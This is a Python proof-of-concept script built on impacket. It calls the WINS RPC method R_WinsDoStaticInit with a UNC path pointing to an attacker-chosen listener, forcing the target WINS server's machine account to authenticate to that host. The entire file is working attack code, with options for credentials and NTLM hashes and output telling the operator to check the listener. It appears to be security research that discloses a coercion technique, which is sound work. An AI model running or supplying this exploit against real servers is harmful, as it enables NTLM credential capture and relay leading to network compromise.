#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Proof of concept for coercing authentication with MS-RAIW::R_WinsDoStaticInit() (opnum 3).
#
# The WINS server reads the LMHOSTS-style file at pDataFilePath and registers its entries. There is
# no UNC validation ([MS-RAIW] 3.1.4.3), so a UNC pDataFilePath coerces the WINS server (machine
# account) to read from it. fDel=0 keeps it non-destructive. Reached over \pipe\WinsPipe. Requires
# WINS control-level access.
import sys, argparse
from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import LPWSTR, DWORD
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin

WINSIF = ('45f52c28-7f9f-101a-b52b-08002b2efabe', '1.0')

class DCERPCSessionError(DCERPCException):
    def __str__(self):
        k = self.error_code
        if k in system_errors.ERROR_MESSAGES:
            s, v = system_errors.ERROR_MESSAGES[k]
            return 'SessionError: code: 0x%x - %s - %s' % (k, s, v)
        return 'SessionError: unknown error code: 0x%x' % k

class R_WinsDoStaticInit(NDRCALL):
    opnum = 3
    structure = (
        ('pDataFilePath', LPWSTR),  # [in, unique, string] LPWSTR
        ('fDel', DWORD),            # [in] DWORD
    )

class R_WinsDoStaticInitResponse(NDRCALL):
    structure = ()

if __name__ == '__main__':
    print("Windows auth coerce using MS-RAIW::R_WinsDoStaticInit()\n")
    p = argparse.ArgumentParser(add_help=True, description="Coerce via MS-RAIW::R_WinsDoStaticInit()")
    p.add_argument("-u", "--username", default="")
    p.add_argument("-p", "--password", default="")
    p.add_argument("-d", "--domain", default="")
    p.add_argument("--hashes", action="store", metavar="[LM]:NT")
    p.add_argument("--share", default="share")
    p.add_argument("listener")
    p.add_argument("target")
    o = p.parse_args()
    lm, nt = ('', '')
    if o.hashes:
        lm, nt = o.hashes.split(':')
    rt = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\WinsPipe]' % o.target)
    if hasattr(rt, 'set_credentials'):
        rt.set_credentials(o.username, o.password, o.domain, lm, nt)
    dce = rt.get_dce_rpc()
    dce.set_auth_type(RPC_C_AUTHN_WINNT)
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    print("[>] Connecting to \\pipe\\WinsPipe ...")
    dce.connect()
    dce.bind(uuidtup_to_bin(WINSIF))
    print("[>] Bound, calling R_WinsDoStaticInit() ...")
    req = R_WinsDoStaticInit()
    req['pDataFilePath'] = ('\\\\%s\\%s\\lmhosts.txt' % (o.listener, o.share)) + '\x00'
    req['fDel'] = 0
    try:
        dce.request(req)
        print("[+] returned success, check your listener.")
    except Exception as e:
        print("[i] returned: %s" % e)
        print("[i] The call was processed by the target, check your listener.")
    sys.exit()
